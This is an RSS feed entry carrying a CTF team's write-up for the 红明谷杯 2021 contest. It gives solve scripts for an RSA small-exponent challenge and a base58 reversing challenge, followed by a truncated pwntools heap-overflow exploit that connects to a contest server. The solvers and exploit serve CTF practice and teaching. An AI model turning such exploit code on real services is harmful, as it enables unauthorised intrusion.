        </item>
        <item>
        <title>红明谷杯 Writeup by X1cT34m</title>
        <link>https://anthem-whisper.github.io/p/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF-writeup-by-x1ct34m/</link>
        <pubDate>Sat, 03 Apr 2021 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF-writeup-by-x1ct34m/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210404094236.png" alt="Featured image of post 红明谷杯 Writeup by X1cT34m" /&gt;&lt;h2 id=&#34;misc&#34;&gt;Misc&lt;/h2&gt;
&lt;h3 id=&#34;签到&#34;&gt;签到&lt;/h3&gt;
&lt;p&gt;BP抓包爆破&lt;/p&gt;
&lt;h2 id=&#34;crypto&#34;&gt;Crypto&lt;/h2&gt;
&lt;h3 id=&#34;rsa-attack&#34;&gt;RSA attack&lt;/h3&gt;
&lt;p&gt;开三次方根就有了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;gmpy2&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iroot&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;Crypto.Util.number&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;p1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649936031&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649902034&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28592245028568852124815768977111125874262599260058745599820769758676575163359612268623240652811172009403854869932602124987089815595007954065785558682294503755479266935877152343298248656222514238984548734114192436817346633473367019138600818158715715935132231386478333980631609437639665255977026081124468935510279104246449817606049991764744352123119281766258347177186790624246492739368005511017524914036614317783472537220720739454744527197507751921840839876863945184171493740832516867733853656800209669179467244407710022070593053034488226101034106881990117738617496520445046561073310892360430531295027470929927226907793&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;15839981826831548396886036749682663273035548220969819480071392201237477433920362840542848967952612687163860026284987497137578272157113399130705412843449686711908583139117413&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iroot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;iroot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;long_to_bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;reverse&#34;&gt;Reverse&lt;/h2&gt;
&lt;h3 id=&#34;go&#34;&gt;go&lt;/h3&gt;
&lt;p&gt;调换顺序 ，base58没了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;base58&lt;/span&gt;

        
&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;2GVdudkYo2CBXoQii7gfpkjTc4gT&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;plaintext&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;table1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;12Nrst6CDquvG7BefghJKLMEFHPQZabRSTUVmyzno89ApwxWXYcdkij345&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;table2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&amp;#34;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)):&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)):&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]):&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;plaintext&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;plaintext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;base58&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b58decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;plaintext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()))&lt;/span&gt;




&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;We1CTFc0m_2345&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;顺序手动调换&lt;/p&gt;
&lt;h2 id=&#34;pwn&#34;&gt;Pwn&lt;/h2&gt;
&lt;h3 id=&#34;双边协议10&#34;&gt;双边协议1.0&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;base64&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#context.log_level = &amp;#39;DEBUG&amp;#39;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;get_argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;c1&#34;&gt;#gdb.attach(p,&amp;#34;b *(0x555555554000+0x1348)&amp;#34;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x12345678&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x30&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;Create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;get_argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Pg==&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;get_argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;emUgPj4=&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;get_argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;bnQgPj4=&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;Free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;get_argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Pg==&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;2&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;Edit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;get_argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Pg==&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;get_argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;bnQgPj4=&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;View&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;get_argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Pg==&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;4&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./main&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./libc-2.23.so&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;8.140.179.11&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;13452&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;FMYY&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;get_argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Pg==&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;get_argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;emUgPj4=&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;get_argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Pg==&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#gdb.attach(p,&amp;#34;b *(0x555555554000+0xD10)&amp;#34;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x28&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x3A1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x378&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x21&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x18&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x791&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x788&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x781&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;bnQgPj4=&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x12345678&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xF30&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xF08&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
